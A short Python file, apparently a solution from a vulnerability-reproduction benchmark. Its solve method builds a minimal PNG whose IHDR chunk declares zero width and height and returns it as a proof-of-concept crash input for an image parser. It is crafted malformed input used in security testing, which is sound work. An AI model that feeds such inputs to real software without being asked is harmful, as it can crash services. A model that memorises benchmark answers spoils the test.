import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = b'\x89PNG\r\n\x1a\n'
        ihdr_data = struct.pack('>I', 0) + struct.pack('>I', 0) + b'\x08\x02\x00\x00\x00'
        ihdr_type = b'IHDR'
        ihdr_crc_data = ihdr_type + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_crc_data) & 0xffffffff)
        ihdr_length = struct.pack('>I', 13)
        ihdr_chunk = ihdr_length + ihdr_type + ihdr_data + ihdr_crc
        iend_length = struct.pack('>I', 0)
        iend_type = b'IEND'
        iend_crc_data = iend_type
        iend_crc = struct.pack('>I', zlib.crc32(iend_crc_data) & 0xffffffff)
        iend_chunk = iend_length + iend_type + iend_crc
        poc = signature + ihdr_chunk + iend_chunk
        return poc
